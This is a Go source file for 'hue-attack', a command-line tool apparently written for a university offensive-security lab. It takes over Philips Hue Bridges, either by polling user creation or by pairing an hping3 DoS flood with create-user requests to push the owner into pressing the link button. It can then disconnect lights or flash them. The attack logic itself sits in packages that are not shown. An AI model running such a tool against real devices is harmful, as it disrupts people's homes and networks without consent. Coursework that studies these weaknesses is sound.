package main

// TODO:
// - Should: De hue bridge blijven checken voor nieuwe lampen, en deze weer disconnecten als ze er zijn
// - MUST: in mooie CLI gieten (opties voor wel of niet DOS'en, wat te doen met lampen (losgooien, disco, knipperen, regenboog, strobe, SOS))

import (
	"context"
	"fmt"
	"hue-bridge-attacker/attacks"
	"hue-bridge-attacker/infiltrations"
	"log"
	"os"
	"time"

	"github.com/amimof/huego"
	"github.com/urfave/cli/v3"
)

const (
	HueBridgeAppName        = "disco-ducks"
	UserCreationRetryPeriod = 10 * time.Second
)

func main() {
	cmd := cli.Command{
		Name:  "hue-attack",
		Usage: "Attacks Philips Hue lights",
		Description: `This program attacks a Philips Hue Bridge. The attack consists of 2 stages. Strategies for these stages are configured using arguments.

Infiltration stage: The goal of this stage is to gain access to the Philips Hue Bridge. Available infiltration strategies are described below.

Attack stage: The goal of this stage is to perform some kind of attack. Available attack strategies are described below.

This program was made for the course 2IC80 Lab on Offensive Computer Security at the Eindhoven University of Technology. Only use this program in environments where you are allowed to.`,
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:  "ip",
				Usage: "Don't discover the Philips Hue Bridge, use this IP by instead",
			},
			&cli.StringFlag{
				Name:    "message",
				Aliases: []string{"m"},
				Usage:   "Only available with \"morse\" attack strategy. Sets the message to communicate via Morse code.",
			},
		},
		ArgsUsage: "[infiltration strategy] [attack strategy]",
		Arguments: []cli.Argument{
			&cli.StringArg{
				Name:      "InfiltrationStrategy",
				UsageText: "Specify which infiltration is used.",
			},
			&cli.StringArg{
				Name:      "AttackStrategy",
				UsageText: "Specify which attack is used.",
			},
		},
		Action: func(ctx context.Context, cmd *cli.Command) error {
			// Check if arguments are provided
			infiltrationStrategy := cmd.StringArg("InfiltrationStrategy")
			attackStrategy := cmd.StringArg("AttackStrategy")
			if infiltrationStrategy == "" && attackStrategy == "" {
				cli.ShowAppHelpAndExit(cmd, 0)
			}
			if infiltrationStrategy == "" {
				log.Fatal("Argument for infiltration strategy is required.")
			}
			if attackStrategy == "" {
				log.Fatal("Argument for attack strategy is required.")
			}

			// Determine which infiltration strategy to use
			var infiltrate infiltrations.InfiltrationFunc
			if infiltrationStrategy == "dos" {
				infiltrate = infiltrations.DosAlternateCreateUser
			} else if infiltrationStrategy == "passive" {
				infiltrate = infiltrations.Passive
			} else {
				log.Fatal("unknown infiltration strategy")
			}

			// Determine the attack strategy to use
			var attack attacks.AttackFunc
			if attackStrategy == "disconnect" {
				attack = attacks.Disconnect
			} else if attackStrategy == "christmas" {
				attack = attacks.Christmas
			} else if attackStrategy == "italian" {
				attack = attacks.Italian
			} else if attackStrategy == "keep-disconnecting" {
				attack = attacks.KeepDisconnecting
			} else if attackStrategy == "rainbow" {
				attack = attacks.Rainbow
			} else if attackStrategy == "morse" {
				message := cmd.String("message")
				if message == "" {
					log.Fatal("The \"message\" flag is required for the morse attack strategy.")
				}
				ctx = context.WithValue(ctx, "message", message)
				attack = attacks.Morse
			} else {
				log.Fatal("unknown attack strategy")
			}

			// Determine which Philips Hue Bridge to use.
			ip := cmd.String("ip")
			var bridge *huego.Bridge
			if ip == "" {
				log.Println("No IP specified, discovering Philips Hue Bridge...")
				bridge = mustDiscoverHueBridge()
			} else {
				bridge = huego.New(ip, "")
			}
			log.Printf("Using Philips Hue Bridge at IP: %s\n", bridge.Host)

			// Gain access to the Philips Hue Bridge
			log.Printf("Starting infiltration using strategy: %s\n", infiltrationStrategy)
			user, err := infiltrate(ctx, bridge)
			if err != nil {
				return fmt.Errorf("error infiltrating philips Hue bridge: %w", err)
			}
			// Use the new user for future communication to the Philips Hue Bridge.
			log.Println("Accessing Philips Hue Bridge with user: ", user)
			bridge = bridge.Login(user)

			// Start the attack
			log.Printf("Starting attack using strategy: %s\n", infiltrationStrategy)
			err = attack(ctx, bridge)
			if err != nil {
				return fmt.Errorf("error attacking: %w", err)
			}

			return nil
		},
	}

	cli.RootCommandHelpTemplate = fmt.Sprintf(`%s
INFILTRATION STRATEGIES:
    passive    Tries to create a user periodically. Hoping that someone eventually presses the link button.
    dos        Alternates a DOS attack (using hping3) on the Philips Hue Bridge with a create user request. Hoping that the DOS will make the user press the link button.

ATTACK STRATEGIES:
    disconnect           Disconnects all lights from the Philips Hue Bridge. This allows you to connect the lights to another Zigbee network.
    keep-disconnecting   Runs the "disconnect" attack every 30 seconds.
    christmas            Makes your lights alternate red and green colors.
    italian              Makes your lights alternate green, white and red colors.
    rainbow              Makes your lights alternate between red, orange, yellow, green, blue and purple colors. 
    morse                Sends a morse code message using the lights.

`, cli.RootCommandHelpTemplate)

	if err := cmd.Run(context.Background(), os.Args); err != nil {
		log.Fatal(err)
	}
}

func mustDiscoverHueBridge() *huego.Bridge {
	bridge, err := huego.Discover()
	if err != nil {
		panic(fmt.Errorf("error while discovering hue bridges: %w", err))
	}

	if bridge.Host == "" {
		panic("Didn't find a hue bridge, exiting...")
	}

	return bridge
}
